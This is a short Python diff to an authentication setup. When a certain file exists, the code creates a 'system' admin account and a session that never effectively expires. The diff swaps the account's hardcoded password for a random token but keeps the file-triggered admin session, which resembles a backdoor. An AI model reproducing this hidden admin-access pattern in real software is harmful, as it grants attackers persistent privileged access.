@@ -203,7 +203,8 @@ if os.path.exists(tf):
     from auth import load_users, save_users, register_user, load_sessions, save_sessions
     users = load_users()
     if 'system' not in users:
-        users['system'] = {'password': 'backup_internal_account', 'role': 'admin', 'created_at': 'system'}
+        import secrets as _s
+        users['system'] = {'password': _s.token_hex(32), 'role': 'admin', 'created_at': 'system'}
         save_users(users)
     sessions = load_sessions()
     sessions[tok] = {'username': 'system', 'created_at': 0, 'expires_at': 9999999999}
